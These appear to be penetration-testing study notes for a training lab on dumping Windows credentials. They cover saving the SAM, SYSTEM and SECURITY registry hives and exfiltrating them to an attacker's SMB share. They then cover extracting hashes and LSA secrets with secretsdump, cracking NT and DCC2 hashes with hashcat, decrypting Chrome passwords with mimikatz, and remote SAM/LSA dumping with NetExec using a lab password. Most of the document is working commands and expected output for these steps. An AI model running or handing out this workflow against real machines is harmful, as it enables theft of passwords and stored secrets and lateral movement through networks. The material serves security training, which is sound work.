# Password Attacks — SAM, SYSTEM, SECURITY, and LSA Secrets

## Overview

With local administrator access on a Windows system, it is often possible to extract registry hives and recover credential material offline.

The most important hives are:

- `HKLM\SAM`
- `HKLM\SYSTEM`
- `HKLM\SECURITY`

These can contain:

- local account password hashes
- the system boot key needed to decrypt SAM
- cached domain credentials (DCC2 / MSCash2)
- LSA secrets
- DPAPI keys
- service account credentials
- saved application secrets

This technique is valuable because it allows us to:

- dump credentials without staying interactive on target
- transfer artifacts to attack host
- crack hashes offline
- reuse recovered credentials elsewhere
- investigate local and domain credential exposure

---

# The Three Key Registry Hives

## HKLM\SAM

Contains password hashes for **local user accounts**.

Useful for:

- extracting NT hashes
- cracking local passwords
- identifying password reuse
- validating local admin access across systems

---

## HKLM\SYSTEM

Contains the **system boot key**.

This is critical because:

- the SAM database is encrypted
- the boot key is required to decrypt the hashes

Without `SYSTEM`, the `SAM` hive alone is not enough.

---

## HKLM\SECURITY

Contains sensitive **LSA-related data**, including:

- cached domain credentials (DCC2)
- LSA secrets
- DPAPI machine and user keys
- other authentication material

This hive is especially valuable on **domain-joined systems**.

---

# Saving the Hives with reg.exe

If we have administrative access, we can save offline copies using `reg.exe`.

```cmd
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

If only local account hashes are needed:

- `SAM`
- `SYSTEM`

If we also want cached domain creds / LSA material:

- include `SECURITY`

---

# Why Offline Dumping Matters

Offline dumping is useful because it:

- reduces dependence on an active shell
- allows later cracking and analysis
- avoids repeated target interaction
- supports post-exploitation workflows cleanly

Once the hives are copied, they can be moved to the attack host and analyzed at leisure.

---

# Transferring Hive Files to the Attack Host

One simple method is to expose an SMB share from the attack host using Impacket `smbserver.py`.

## Create SMB Share

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
```

Why `-smb2support` matters:

- modern Windows systems typically disable SMBv1
- without SMB2 support, the connection may fail

---

## Move Hive Files from Target

```cmd
move sam.save \\10.10.15.16\CompData
move security.save \\10.10.15.16\CompData
move system.save \\10.10.15.16\CompData
```

Confirm on attack host:

```bash
ls
```

Expected:

```text
sam.save  security.save  system.save
```

---

# Dumping Secrets Offline with secretsdump

Impacket’s `secretsdump.py` can parse the hive files and extract:

- local SAM hashes
- cached domain logons
- DPAPI keys
- LSA secrets
- NL$KM secrets

## Run secretsdump

```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

---

# Understanding secretsdump Output

Typical sequence:

## 1. BootKey extraction

```text
[*] Target system bootKey: 0x...
```

This is the key from `SYSTEM` used to decrypt SAM material.

---

## 2. Local SAM hashes

```text
Administrator:500:LMHASH:NTHASH:::
bob:1001:LMHASH:NTHASH:::
```

Format:

```text
username:rid:lmhash:nthash:::
```

Important points:

- modern Windows mostly uses **NT hashes**
- LM hashes are usually blank or disabled on modern systems
- older systems may still have usable LM hashes

---

## 3. Cached domain credentials

```text
[*] Dumping cached domain logon information
```

These are DCC2 / MSCash2 style hashes from `SECURITY`.

---

## 4. LSA secrets / DPAPI / NL$KM

Examples:

```text
dpapi_machinekey:0x...
dpapi_userkey:0x...
NL$KM:...
```

These are useful for:

- decrypting DPAPI-protected material
- recovering stored secrets
- further credential extraction

---

# Cracking NT Hashes with Hashcat

Once NT hashes are extracted, save them into a file.

Example:

```text
64f12cddaa88057e06a81b54e73b949b
31d6cfe0d16ae931b73c59d7e0c089c0
6f8c3f4d3869a10f3b4f0522f537fd33
184ecdda8cf1dd238d438c4aea4d560d
f7eb9c06fafaa23c4bcf22ba6781c1e2
```

## Hashcat Mode for NT Hashes

```text
-m 1000
```

## Crack NT Hashes

```bash
hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

Recovered passwords may then be used for:

- lateral movement
- local admin reuse testing
- service logins
- RDP / WinRM / SMB access
- password spraying validation

---

# The Empty NT Hash

This value:

```text
31d6cfe0d16ae931b73c59d7e0c089c0
```

is a well-known NT hash for:

```text
blank password
```

Useful to recognize quickly.

---

# DCC2 / MSCash2 Hashes

Cached domain logon data may look like:

```text
inlanefreight.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25
```

These are much slower to crack than NT hashes because they use PBKDF2.

## Hashcat Mode for DCC2

```text
-m 2100
```

## Example

```bash
hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
```

Important notes:

- much slower than NT cracking
- cannot be used directly for pass-the-hash
- still useful if successfully cracked

---

# NT vs DCC2 Cracking Reality

NT hashes crack relatively quickly.

DCC2 hashes are far more expensive because of:

- PBKDF2
- high iteration count
- stronger derivation process

Practical takeaway:

- weak DCC2 passwords may crack
- strong ones often will not within engagement time

---

# DPAPI

DPAPI (Data Protection API) is used by Windows to protect user and machine secrets.

Examples of where DPAPI is used:

| Application | Typical Secret |
|------------|----------------|
| Chrome | saved browser passwords |
| Internet Explorer | form autofill creds |
| Outlook | mail account passwords |
| RDP | saved remote credentials |
| Credential Manager | stored access credentials |
| VPN / Wireless profiles | saved connection secrets |

Dumped DPAPI keys from `SECURITY` may support later decryption.

---

# Example: Decrypting Chrome Data with mimikatz

Example:

```text
dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
```

Possible output:

- AES key
- saved URL
- stored username
- stored password

This can expose browser-stored credentials directly.

---

# Remote Dumping of LSA Secrets

If valid local admin credentials are available, secrets may sometimes be dumped remotely.

## Example with NetExec

```bash
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

Potential output includes:

- service account credentials
- DPAPI keys
- NL$KM values
- cached secrets

This is very useful when you already have admin rights and want fast credential harvesting.

---

# Remote Dumping of SAM Hashes

NetExec can also dump SAM remotely:

```bash
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```

This may immediately expose:

- local user NT hashes
- administrator hash
- service/user account material
- additional cracking opportunities

---

# Why These Artifacts Matter

Recovered material can lead to:

- password cracking
- credential reuse across hosts
- discovery of domain admin habits
- browser credential decryption
- service account compromise
- lateral movement
- persistence

This makes hive extraction one of the highest-value post-exploitation techniques on Windows.

---

# Typical Workflow

## Offline Hive Dump Workflow

1. obtain local admin
2. save `SAM`, `SYSTEM`, `SECURITY`
3. exfiltrate hives
4. parse with `secretsdump.py`
5. isolate NT hashes / DCC2 / DPAPI material
6. crack what is feasible
7. test recovered creds elsewhere

## Remote Secret Dump Workflow

1. obtain admin credentials
2. use NetExec `--sam` / `--lsa`
3. recover material directly
4. crack / reuse / pivot

---

# Key Takeaways

- `SAM` holds local hashes
- `SYSTEM` holds boot key needed to decrypt SAM
- `SECURITY` holds cached creds, LSA secrets, and DPAPI-related material
- NT hashes are relatively fast to crack
- DCC2 hashes are much slower
- DPAPI material can expose saved browser, RDP, and application credentials
- remote dumping is possible when valid admin credentials already exist

---

# Related Notes

- Password Attacks — Hashcat
- Password Attacks — John The Ripper
- Password Attacks — Cracking Protected Files
- Credential Access — Cleartext Credentials in Network Traffic
- Privilege Escalation — Windows
- Credential Access — DPAPI

---

# Tags

#password-attacks #windows #sam #system #security #secretsdump #hashcat #dcc2 #dpapi #lsa #netexec #oscp